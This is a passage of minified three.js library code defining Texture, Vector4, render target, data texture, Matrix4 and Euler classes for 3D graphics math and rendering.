s={metadata:{version:4.7,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(e).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,normalized:this.normalized,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(s.userData=this.userData),i||(e.textures[this.uuid]=s),s}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(e){if(this.mapping!==Bx)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case op:e.x=e.x-Math.floor(e.x);break;case Na:e.x=e.x<0?0:1;break;case lp:Math.abs(Math.floor(e.x)%2)===1?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x);break}if(e.y<0||e.y>1)switch(this.wrapT){case op:e.y=e.y-Math.floor(e.y);break;case Na:e.y=e.y<0?0:1;break;case lp:Math.abs(Math.floor(e.y)%2)===1?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y);break}return this.flipY&&(e.y=1-e.y),e}set needsUpdate(e){e===!0&&(this.version++,this.source.needsUpdate=!0)}set needsPMREMUpdate(e){e===!0&&this.pmremVersion++}}Xn.DEFAULT_IMAGE=null;Xn.DEFAULT_MAPPING=Bx;Xn.DEFAULT_ANISOTROPY=1;const om=class om{constructor(e=0,i=0,s=0,c=1){this.x=e,this.y=i,this.z=s,this.w=c}get width(){return this.z}set width(e){this.z=e}get height(){return this.w}set height(e){this.w=e}set(e,i,s,c){return this.x=e,this.y=i,this.z=s,this.w=c,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setW(e){return this.w=e,this}setComponent(e,i){switch(e){case 0:this.x=i;break;case 1:this.y=i;break;case 2:this.z=i;break;case 3:this.w=i;break;default:throw new Error("THREE.Vector4: index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("THREE.Vector4: index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w!==void 0?e.w:1,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}addVectors(e,i){return this.x=e.x+i.x,this.y=e.y+i.y,this.z=e.z+i.z,this.w=e.w+i.w,this}addScaledVector(e,i){return this.x+=e.x*i,this.y+=e.y*i,this.z+=e.z*i,this.w+=e.w*i,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}subVectors(e,i){return this.x=e.x-i.x,this.y=e.y-i.y,this.z=e.z-i.z,this.w=e.w-i.w,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}applyMatrix4(e){const i=this.x,s=this.y,c=this.z,f=this.w,d=e.elements;return this.x=d[0]*i+d[4]*s+d[8]*c+d[12]*f,this.y=d[1]*i+d[5]*s+d[9]*c+d[13]*f,this.z=d[2]*i+d[6]*s+d[10]*c+d[14]*f,this.w=d[3]*i+d[7]*s+d[11]*c+d[15]*f,this}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this.w/=e.w,this}divideScalar(e){return this.multiplyScalar(1/e)}setAxisAngleFromQuaternion(e){this.w=2*Math.acos(e.w);const i=Math.sqrt(1-e.w*e.w);return i<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/i,this.y=e.y/i,this.z=e.z/i),this}setAxisAngleFromRotationMatrix(e){let i,s,c,f;const m=e.elements,p=m[0],x=m[4],v=m[8],_=m[1],E=m[5],T=m[9],w=m[2],y=m[6],S=m[10];if(Math.abs(x-_)<.01&&Math.abs(v-w)<.01&&Math.abs(T-y)<.01){if(Math.abs(x+_)<.1&&Math.abs(v+w)<.1&&Math.abs(T+y)<.1&&Math.abs(p+E+S-3)<.1)return this.set(1,0,0,0),this;i=Math.PI;const B=(p+1)/2,C=(E+1)/2,U=(S+1)/2,D=(x+_)/4,P=(v+w)/4,b=(T+y)/4;return B>C&&B>U?B<.01?(s=0,c=.707106781,f=.707106781):(s=Math.sqrt(B),c=D/s,f=P/s):C>U?C<.01?(s=.707106781,c=0,f=.707106781):(c=Math.sqrt(C),s=D/c,f=b/c):U<.01?(s=.707106781,c=.707106781,f=0):(f=Math.sqrt(U),s=P/f,c=b/f),this.set(s,c,f,i),this}let N=Math.sqrt((y-T)*(y-T)+(v-w)*(v-w)+(_-x)*(_-x));return Math.abs(N)<.001&&(N=1),this.x=(y-T)/N,this.y=(v-w)/N,this.z=(_-x)/N,this.w=Math.acos((p+E+S-1)/2),this}setFromMatrixPosition(e){const i=e.elements;return this.x=i[12],this.y=i[13],this.z=i[14],this.w=i[15],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}clamp(e,i){return this.x=Ne(this.x,e.x,i.x),this.y=Ne(this.y,e.y,i.y),this.z=Ne(this.z,e.z,i.z),this.w=Ne(this.w,e.w,i.w),this}clampScalar(e,i){return this.x=Ne(this.x,e,i),this.y=Ne(this.y,e,i),this.z=Ne(this.z,e,i),this.w=Ne(this.w,e,i),this}clampLength(e,i){const s=this.length();return this.divideScalar(s||1).multiplyScalar(Ne(s,e,i))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,i){return this.x+=(e.x-this.x)*i,this.y+=(e.y-this.y)*i,this.z+=(e.z-this.z)*i,this.w+=(e.w-this.w)*i,this}lerpVectors(e,i,s){return this.x=e.x+(i.x-e.x)*s,this.y=e.y+(i.y-e.y)*s,this.z=e.z+(i.z-e.z)*s,this.w=e.w+(i.w-e.w)*s,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}fromArray(e,i=0){return this.x=e[i],this.y=e[i+1],this.z=e[i+2],this.w=e[i+3],this}toArray(e=[],i=0){return e[i]=this.x,e[i+1]=this.y,e[i+2]=this.z,e[i+3]=this.w,e}fromBufferAttribute(e,i){return this.x=e.getX(i),this.y=e.getY(i),this.z=e.getZ(i),this.w=e.getW(i),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}};om.prototype.isVector4=!0;let ln=om;class ab extends Jr{constructor(e=1,i=1,s={}){super(),s=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:In,depthBuffer:!0,stencilBuffer:!1,resolveColorBuffer:!0,resolveDepthBuffer:!0,resolveStencilBuffer:!0,storeMultisampledColorBuffer:!0,storeMultisampledDepthBuffer:!0,storeMultisampledStencilBuffer:!0,depthTexture:null,samples:0,count:1,depth:1,multiview:!1,useArrayDepthTexture:!1},s),this.isRenderTarget=!0,this.width=e,this.height=i,this.depth=s.depth,this.scissor=new ln(0,0,e,i),this.scissorTest=!1,this.viewport=new ln(0,0,e,i),this.textures=[];const c={width:e,height:i,depth:s.depth},f=new Xn(c),d=s.count;for(let h=0;h<d;h++)this.textures[h]=f.clone(),this.textures[h].isRenderTargetTexture=!0,this.textures[h].renderTarget=this;this._setTextureOptions(s),this.depthBuffer=s.depthBuffer,this.stencilBuffer=s.stencilBuffer,this.resolveColorBuffer=s.resolveColorBuffer,this.resolveDepthBuffer=s.resolveDepthBuffer,this.resolveStencilBuffer=s.resolveStencilBuffer,this.storeMultisampledColorBuffer=s.storeMultisampledColorBuffer,this.storeMultisampledDepthBuffer=s.storeMultisampledDepthBuffer,this.storeMultisampledStencilBuffer=s.storeMultisampledStencilBuffer,this._depthTexture=null,this.depthTexture=s.depthTexture,this.samples=s.samples,this.multiview=s.multiview,this.useArrayDepthTexture=s.useArrayDepthTexture}_setTextureOptions(e={}){const i={minFilter:In,generateMipmaps:!1,flipY:!1,internalFormat:null};e.mapping!==void 0&&(i.mapping=e.mapping),e.wrapS!==void 0&&(i.wrapS=e.wrapS),e.wrapT!==void 0&&(i.wrapT=e.wrapT),e.wrapR!==void 0&&(i.wrapR=e.wrapR),e.magFilter!==void 0&&(i.magFilter=e.magFilter),e.minFilter!==void 0&&(i.minFilter=e.minFilter),e.format!==void 0&&(i.format=e.format),e.type!==void 0&&(i.type=e.type),e.anisotropy!==void 0&&(i.anisotropy=e.anisotropy),e.colorSpace!==void 0&&(i.colorSpace=e.colorSpace),e.flipY!==void 0&&(i.flipY=e.flipY),e.generateMipmaps!==void 0&&(i.generateMipmaps=e.generateMipmaps),e.internalFormat!==void 0&&(i.internalFormat=e.internalFormat);for(let s=0;s<this.textures.length;s++)this.textures[s].setValues(i)}get texture(){return this.textures[0]}set texture(e){this.textures[0]=e}set depthTexture(e){this._depthTexture!==null&&this._depthTexture.renderTarget===this&&(this._depthTexture.renderTarget=null),e!==null&&e.renderTarget===null&&(e.renderTarget=this),this._depthTexture=e}get depthTexture(){return this._depthTexture}setSize(e,i,s=1){if(this.width!==e||this.height!==i||this.depth!==s){this.width=e,this.height=i,this.depth=s;for(let c=0,f=this.textures.length;c<f;c++)this.textures[c].image.width=e,this.textures[c].image.height=i,this.textures[c].image.depth=s,this.textures[c].isData3DTexture!==!0&&(this.textures[c].isArrayTexture=this.textures[c].image.depth>1);this.dispose()}this.viewport.set(0,0,e,i),this.scissor.set(0,0,e,i)}clone(){return new this.constructor().copy(this)}copy(e){this.width=e.width,this.height=e.height,this.depth=e.depth,this.scissor.copy(e.scissor),this.scissorTest=e.scissorTest,this.viewport.copy(e.viewport),this.textures.length=0;for(let i=0,s=e.textures.length;i<s;i++){this.textures[i]=e.textures[i].clone(),this.textures[i].isRenderTargetTexture=!0,this.textures[i].renderTarget=this;const c=Object.assign({},e.textures[i].image);this.textures[i].source=new tm(c)}if(this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.resolveColorBuffer=e.resolveColorBuffer,this.resolveDepthBuffer=e.resolveDepthBuffer,this.resolveStencilBuffer=e.resolveStencilBuffer,this.storeMultisampledColorBuffer=e.storeMultisampledColorBuffer,this.storeMultisampledDepthBuffer=e.storeMultisampledDepthBuffer,this.storeMultisampledStencilBuffer=e.storeMultisampledStencilBuffer,e.depthTexture!==null)if(e.depthTexture.renderTarget===e){const i=e.depthTexture.clone();i.renderTarget=null,this.depthTexture=i}else this.depthTexture=e.depthTexture;return this.samples=e.samples,this.multiview=e.multiview,this.useArrayDepthTexture=e.useArrayDepthTexture,this}dispose(){this.dispatchEvent({type:"dispose"})}}class Bi extends ab{constructor(e=1,i=1,s={}){super(e,i,s),this.isWebGLRenderTarget=!0}}class Yx extends Xn{constructor(e=null,i=1,s=1,c=1){super(null),this.isDataArrayTexture=!0,this.image={data:e,width:i,height:s,depth:c},this.magFilter=Un,this.minFilter=Un,this.wrapR=Na,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.layerUpdates=new Set}copy(e){return super.copy(e),this.wrapR=e.wrapR,this}addLayerUpdate(e){this.layerUpdates.add(e)}clearLayerUpdates(){this.layerUpdates.clear()}}class rb extends Xn{constructor(e=null,i=1,s=1,c=1){super(null),this.isData3DTexture=!0,this.image={data:e,width:i,height:s,depth:c},this.magFilter=Un,this.minFilter=Un,this.wrapR=Na,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}copy(e){return super.copy(e),this.wrapR=e.wrapR,this}}const Pu=class Pu{constructor(e,i,s,c,f,d,h,m,p,x,v,_,E,T,w,y){this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],e!==void 0&&this.set(e,i,s,c,f,d,h,m,p,x,v,_,E,T,w,y)}set(e,i,s,c,f,d,h,m,p,x,v,_,E,T,w,y){const S=this.elements;return S[0]=e,S[4]=i,S[8]=s,S[12]=c,S[1]=f,S[5]=d,S[9]=h,S[13]=m,S[2]=p,S[6]=x,S[10]=v,S[14]=_,S[3]=E,S[7]=T,S[11]=w,S[15]=y,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new Pu().fromArray(this.elements)}copy(e){const i=this.elements,s=e.elements;return i[0]=s[0],i[1]=s[1],i[2]=s[2],i[3]=s[3],i[4]=s[4],i[5]=s[5],i[6]=s[6],i[7]=s[7],i[8]=s[8],i[9]=s[9],i[10]=s[10],i[11]=s[11],i[12]=s[12],i[13]=s[13],i[14]=s[14],i[15]=s[15],this}copyPosition(e){const i=this.elements,s=e.elements;return i[12]=s[12],i[13]=s[13],i[14]=s[14],this}setFromMatrix3(e){const i=e.elements;return this.set(i[0],i[3],i[6],0,i[1],i[4],i[7],0,i[2],i[5],i[8],0,0,0,0,1),this}extractBasis(e,i,s){return this.determinantAffine()===0?(e.set(1,0,0),i.set(0,1,0),s.set(0,0,1),this):(e.setFromMatrixColumn(this,0),i.setFromMatrixColumn(this,1),s.setFromMatrixColumn(this,2),this)}makeBasis(e,i,s){return this.set(e.x,i.x,s.x,0,e.y,i.y,s.y,0,e.z,i.z,s.z,0,0,0,0,1),this}extractRotation(e){if(e.determinantAffine()===0)return this.identity();const i=this.elements,s=e.elements,c=1/Gs.setFromMatrixColumn(e,0).length(),f=1/Gs.setFromMatrixColumn(e,1).length(),d=1/Gs.setFromMatrixColumn(e,2).length();return i[0]=s[0]*c,i[1]=s[1]*c,i[2]=s[2]*c,i[3]=0,i[4]=s[4]*f,i[5]=s[5]*f,i[6]=s[6]*f,i[7]=0,i[8]=s[8]*d,i[9]=s[9]*d,i[10]=s[10]*d,i[11]=0,i[12]=0,i[13]=0,i[14]=0,i[15]=1,this}makeRotationFromEuler(e){const i=this.elements,s=e.x,c=e.y,f=e.z,d=Math.cos(s),h=Math.sin(s),m=Math.cos(c),p=Math.sin(c),x=Math.cos(f),v=Math.sin(f);if(e.order==="XYZ"){const _=d*x,E=d*v,T=h*x,w=h*v;i[0]=m*x,i[4]=-m*v,i[8]=p,i[1]=E+T*p,i[5]=_-w*p,i[9]=-h*m,i[2]=w-_*p,i[6]=T+E*p,i[10]=d*m}else if(e.order==="YXZ"){const _=m*x,E=m*v,T=p*x,w=p*v;i[0]=_+w*h,i[4]=T*h-E,i[8]=d*p,i[1]=d*v,i[5]=d*x,i[9]=-h,i[2]=E*h-T,i[6]=w+_*h,i[10]=d*m}else if(e.order==="ZXY"){const _=m*x,E=m*v,T=p*x,w=p*v;i[0]=_-w*h,i[4]=-d*v,i[8]=T+E*h,i[1]=E+T*h,i[5]=d*x,i[9]=w-_*h,i[2]=-d*p,i[6]=h,i[10]=d*m}else if(e.order==="ZYX"){const _=d*x,E=d*v,T=h*x,w=h*v;i[0]=m*x,i[4]=T*p-E,i[8]=_*p+w,i[1]=m*v,i[5]=w*p+_,i[9]=E*p-T,i[2]=-p,i[6]=h*m,i[10]=d*m}else if(e.order==="YZX"){const _=d*m,E=d*p,T=h*m,w=h*p;i[0]=m*x,i[4]=w-_*v,i[8]=T*v+E,i[1]=v,i[5]=d*x,i[9]=-h*x,i[2]=-p*x,i[6]=E*v+T,i[10]=_-w*v}else if(e.order==="XZY"){const _=d*m,E=d*p,T=h*m,w=h*p;i[0]=m*x,i[4]=-v,i[8]=p*x,i[1]=_*v+w,i[5]=d*x,i[9]=E*v-T,i[2]=T*v-E,i[6]=h*x,i[10]=w*v+_}return i[3]=0,i[7]=0,i[11]=0,i[12]=0,i[13]=0,i[14]=0,i[15]=1,this}makeRotationFromQuaternion(e){return this.compose(sb,e,ob)}lookAt(e,i,s){const c=this.elements;return ui.subVectors(e,i),ui.lengthSq()===0&&(ui.z=1),ui.normalize(),ur.crossVectors(s,ui),ur.lengthSq()===0&&(Math.abs(s.z)===1?ui.x+=1e-4:ui.z+=1e-4,ui.normalize(),ur.crossVectors(s,ui)),ur.normalize(),Zc.crossVectors(ui,ur),c[0]=ur.x,c[4]=Zc.x,c[8]=ui.x,c[1]=ur.y,c[5]=Zc.y,c[9]=ui.y,c[2]=ur.z,c[6]=Zc.z,c[10]=ui.z,this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,i){const s=e.elements,c=i.elements,f=this.elements,d=s[0],h=s[4],m=s[8],p=s[12],x=s[1],v=s[5],_=s[9],E=s[13],T=s[2],w=s[6],y=s[10],S=s[14],N=s[3],B=s[7],C=s[11],U=s[15],D=c[0],P=c[4],b=c[8],L=c[12],F=c[1],V=c[5],$=c[9],ft=c[13],j=c[2],et=c[6],q=c[10],W=c[14],ht=c[3],lt=c[7],mt=c[11],gt=c[15];return f[0]=d*D+h*F+m*j+p*ht,f[4]=d*P+h*V+m*et+p*lt,f[8]=d*b+h*$+m*q+p*mt,f[12]=d*L+h*ft+m*W+p*gt,f[1]=x*D+v*F+_*j+E*ht,f[5]=x*P+v*V+_*et+E*lt,f[9]=x*b+v*$+_*q+E*mt,f[13]=x*L+v*ft+_*W+E*gt,f[2]=T*D+w*F+y*j+S*ht,f[6]=T*P+w*V+y*et+S*lt,f[10]=T*b+w*$+y*q+S*mt,f[14]=T*L+w*ft+y*W+S*gt,f[3]=N*D+B*F+C*j+U*ht,f[7]=N*P+B*V+C*et+U*lt,f[11]=N*b+B*$+C*q+U*mt,f[15]=N*L+B*ft+C*W+U*gt,this}multiplyScalar(e){const i=this.elements;return i[0]*=e,i[4]*=e,i[8]*=e,i[12]*=e,i[1]*=e,i[5]*=e,i[9]*=e,i[13]*=e,i[2]*=e,i[6]*=e,i[10]*=e,i[14]*=e,i[3]*=e,i[7]*=e,i[11]*=e,i[15]*=e,this}determinant(){const e=this.elements,i=e[0],s=e[4],c=e[8],f=e[12],d=e[1],h=e[5],m=e[9],p=e[13],x=e[2],v=e[6],_=e[10],E=e[14],T=e[3],w=e[7],y=e[11],S=e[15],N=m*E-p*_,B=h*E-p*v,C=h*_-m*v,U=d*E-p*x,D=d*_-m*x,P=d*v-h*x;return i*(w*N-y*B+S*C)-s*(T*N-y*U+S*D)+c*(T*B-w*U+S*P)-f*(T*C-w*D+y*P)}determinantAffine(){const e=this.elements,i=e[0],s=e[4],c=e[8],f=e[1],d=e[5],h=e[9],m=e[2],p=e[6],x=e[10];return i*(d*x-h*p)-s*(f*x-h*m)+c*(f*p-d*m)}transpose(){const e=this.elements;let i;return i=e[1],e[1]=e[4],e[4]=i,i=e[2],e[2]=e[8],e[8]=i,i=e[6],e[6]=e[9],e[9]=i,i=e[3],e[3]=e[12],e[12]=i,i=e[7],e[7]=e[13],e[13]=i,i=e[11],e[11]=e[14],e[14]=i,this}setPosition(e,i,s){const c=this.elements;return e.isVector3?(c[12]=e.x,c[13]=e.y,c[14]=e.z):(c[12]=e,c[13]=i,c[14]=s),this}invert(){const e=this.elements,i=e[0],s=e[1],c=e[2],f=e[3],d=e[4],h=e[5],m=e[6],p=e[7],x=e[8],v=e[9],_=e[10],E=e[11],T=e[12],w=e[13],y=e[14],S=e[15],N=i*h-s*d,B=i*m-c*d,C=i*p-f*d,U=s*m-c*h,D=s*p-f*h,P=c*p-f*m,b=x*w-v*T,L=x*y-_*T,F=x*S-E*T,V=v*y-_*w,$=v*S-E*w,ft=_*S-E*y,j=N*ft-B*$+C*V+U*F-D*L+P*b;if(j===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const et=1/j;return e[0]=(h*ft-m*$+p*V)*et,e[1]=(c*$-s*ft-f*V)*et,e[2]=(w*P-y*D+S*U)*et,e[3]=(_*D-v*P-E*U)*et,e[4]=(m*F-d*ft-p*L)*et,e[5]=(i*ft-c*F+f*L)*et,e[6]=(y*C-T*P-S*B)*et,e[7]=(x*P-_*C+E*B)*et,e[8]=(d*$-h*F+p*b)*et,e[9]=(s*F-i*$-f*b)*et,e[10]=(T*D-w*C+S*N)*et,e[11]=(v*C-x*D-E*N)*et,e[12]=(h*L-d*V-m*b)*et,e[13]=(i*V-s*L+c*b)*et,e[14]=(w*B-T*U-y*N)*et,e[15]=(x*U-v*B+_*N)*et,this}scale(e){const i=this.elements,s=e.x,c=e.y,f=e.z;return i[0]*=s,i[4]*=c,i[8]*=f,i[1]*=s,i[5]*=c,i[9]*=f,i[2]*=s,i[6]*=c,i[10]*=f,i[3]*=s,i[7]*=c,i[11]*=f,this}getMaxScaleOnAxis(){const e=this.elements,i=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],s=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],c=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(i,s,c))}makeTranslation(e,i,s){return e.isVector3?this.set(1,0,0,e.x,0,1,0,e.y,0,0,1,e.z,0,0,0,1):this.set(1,0,0,e,0,1,0,i,0,0,1,s,0,0,0,1),this}makeRotationX(e){const i=Math.cos(e),s=Math.sin(e);return this.set(1,0,0,0,0,i,-s,0,0,s,i,0,0,0,0,1),this}makeRotationY(e){const i=Math.cos(e),s=Math.sin(e);return this.set(i,0,s,0,0,1,0,0,-s,0,i,0,0,0,0,1),this}makeRotationZ(e){const i=Math.cos(e),s=Math.sin(e);return this.set(i,-s,0,0,s,i,0,0,0,0,1,0,0,0,0,1),this}makeRotationAxis(e,i){const s=Math.cos(i),c=Math.sin(i),f=1-s,d=e.x,h=e.y,m=e.z,p=f*d,x=f*h;return this.set(p*d+s,p*h-c*m,p*m+c*h,0,p*h+c*m,x*h+s,x*m-c*d,0,p*m-c*h,x*m+c*d,f*m*m+s,0,0,0,0,1),this}makeScale(e,i,s){return this.set(e,0,0,0,0,i,0,0,0,0,s,0,0,0,0,1),this}makeShear(e,i,s,c,f,d){return this.set(1,s,f,0,e,1,d,0,i,c,1,0,0,0,0,1),this}compose(e,i,s){const c=this.elements,f=i._x,d=i._y,h=i._z,m=i._w,p=f+f,x=d+d,v=h+h,_=f*p,E=f*x,T=f*v,w=d*x,y=d*v,S=h*v,N=m*p,B=m*x,C=m*v,U=s.x,D=s.y,P=s.z;return c[0]=(1-(w+S))*U,c[1]=(E+C)*U,c[2]=(T-B)*U,c[3]=0,c[4]=(E-C)*D,c[5]=(1-(_+S))*D,c[6]=(y+N)*D,c[7]=0,c[8]=(T+B)*P,c[9]=(y-N)*P,c[10]=(1-(_+w))*P,c[11]=0,c[12]=e.x,c[13]=e.y,c[14]=e.z,c[15]=1,this}decompose(e,i,s){const c=this.elements;e.x=c[12],e.y=c[13],e.z=c[14];const f=this.determinantAffine();if(f===0)return s.set(1,1,1),i.identity(),this;let d=Gs.set(c[0],c[1],c[2]).length();const h=Gs.set(c[4],c[5],c[6]).length(),m=Gs.set(c[8],c[9],c[10]).length();f<0&&(d=-d),Li.copy(this);const p=1/d,x=1/h,v=1/m;return Li.elements[0]*=p,Li.elements[1]*=p,Li.elements[2]*=p,Li.elements[4]*=x,Li.elements[5]*=x,Li.elements[6]*=x,Li.elements[8]*=v,Li.elements[9]*=v,Li.elements[10]*=v,i.setFromRotationMatrix(Li),s.x=d,s.y=h,s.z=m,this}makePerspective(e,i,s,c,f,d,h=aa,m=!1){const p=this.elements,x=2*f/(i-e),v=2*f/(s-c),_=(i+e)/(i-e),E=(s+c)/(s-c);let T,w;if(m)T=f/(d-f),w=d*f/(d-f);else if(h===aa)T=-(d+f)/(d-f),w=-2*d*f/(d-f);else if(h===Du)T=-d/(d-f),w=-d*f/(d-f);else throw new Error("THREE.Matrix4.makePerspective(): Invalid coordinate system: "+h);return p[0]=x,p[4]=0,p[8]=_,p[12]=0,p[1]=0,p[5]=v,p[9]=E,p[13]=0,p[2]=0,p[6]=0,p[10]=T,p[14]=w,p[3]=0,p[7]=0,p[11]=-1,p[15]=0,this}makeOrthographic(e,i,s,c,f,d,h=aa,m=!1){const p=this.elements,x=2/(i-e),v=2/(s-c),_=-(i+e)/(i-e),E=-(s+c)/(s-c);let T,w;if(m)T=1/(d-f),w=d/(d-f);else if(h===aa)T=-2/(d-f),w=-(d+f)/(d-f);else if(h===Du)T=-1/(d-f),w=-f/(d-f);else throw new Error("THREE.Matrix4.makeOrthographic(): Invalid coordinate system: "+h);return p[0]=x,p[4]=0,p[8]=0,p[12]=_,p[1]=0,p[5]=v,p[9]=0,p[13]=E,p[2]=0,p[6]=0,p[10]=T,p[14]=w,p[3]=0,p[7]=0,p[11]=0,p[15]=1,this}equals(e){const i=this.elements,s=e.elements;for(let c=0;c<16;c++)if(i[c]!==s[c])return!1;return!0}fromArray(e,i=0){for(let s=0;s<16;s++)this.elements[s]=e[s+i];return this}toArray(e=[],i=0){const s=this.elements;return e[i]=s[0],e[i+1]=s[1],e[i+2]=s[2],e[i+3]=s[3],e[i+4]=s[4],e[i+5]=s[5],e[i+6]=s[6],e[i+7]=s[7],e[i+8]=s[8],e[i+9]=s[9],e[i+10]=s[10],e[i+11]=s[11],e[i+12]=s[12],e[i+13]=s[13],e[i+14]=s[14],e[i+15]=s[15],e}};Pu.prototype.isMatrix4=!0;let cn=Pu;const Gs=new it,Li=new cn,sb=new it(0,0,0),ob=new it(1,1,1),ur=new it,Zc=new it,ui=new it,Uv=new cn,Lv=new ro;class Qr{constructor(e=0,i=0,s=0,c=Qr.DEFAULT_ORDER){this.isEuler=!0,this._x=e,this._y=i,this._z=s,this._order=c}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get order(){return this._order}set order(e){this._order=e,this._onChangeCallback()}set(e,i,s,c=this._order){return this._x=e,this._y=i,this._z=s,this._order=c,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._order)}copy(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}setFromRotationMatrix(e,i=this._order,s=!0){const c=e.elements,f=c[0],d=c[4],h=c[8],m=c[1],p=c[5],x=c[9],v=c[2],_=c[6],E=c[10];switch(i){case"XYZ":this._y=Math.asin(Ne(h,-1,1)),Math.abs(h)<.9999999?(this._x=Math.atan2(-x,E),this._z=Math.atan2(-d,f)):(this._x=Math.atan2(_,p),this._z=0);break;case"YXZ":this._x=Math.asin(-Ne(x,-1,1)),Math.abs(x)<.9999999?(this._y=Math.atan2(h,E),this._z=Math.atan2(m,p)):(this._y=Math.atan2(-v,f),this._z=0);break;case"ZXY":this._x=Math.asin(Ne(_,-1,1)),Math.abs(_)<.9999999?(this._y=Math.atan2(-v,E),this._z=Math.atan2(-d,p)):(this._y=0,this._z=Math.atan2(m,f));break;case"ZYX":this._y=Math.asin(-Ne(v,-1,1)),Math.abs(v)<.9999999?(this._x=Math.atan2(_,E),this._z=Math.atan2(m,f)):(this._x=0,this._z=Math.atan2(-d,p));break;case"YZX":this._z=Math.asin(Ne(m,-1,1)),Math.abs(m)<.9999999?(this._x=Math.atan2(-x,p),this._y=Math.atan2(-v,f)):(this._x=0,this._y=Math.atan2(h,E));break;case"XZY":this._z=Math.asin(-Ne(d,-1,1)),Math.abs(d)<.9999999?(this._x=Math.atan2(_,p),this._y=Math.atan2(h,f)):(this._x=Math.atan2(-x,E),this._y=0);break;default:se("Euler: .setFromRotationMatrix() encountered an unknown order: "+i)}return this._order=i,s===!0&&this._onChangeCallback(),this}setFromQuaternion(e,i,s){return Uv.makeRotationFromQuaternion(e),this.setFromRotationMatrix(Uv,i,s)}setFromVector3(e,i=this._order){return this.set(e.x,e.y,e.z,i)}reorder(e){return Lv.setFromEuler(this),this.setFromQuaternion(Lv,e)}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}fromArray(e){return this._x=e[0],this._y=e[1],this._z=e[2],e[3]!==void 0&&(this._order=e[3]),this._onChangeCallback(),this}toArray(e=[],i=0){return e[i]=this._x,e[i+1]=this._y,e[i+2]=this._z,e[i+3]=this._order,e}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._order}}Qr.DEFAULT_ORDER="XYZ";class 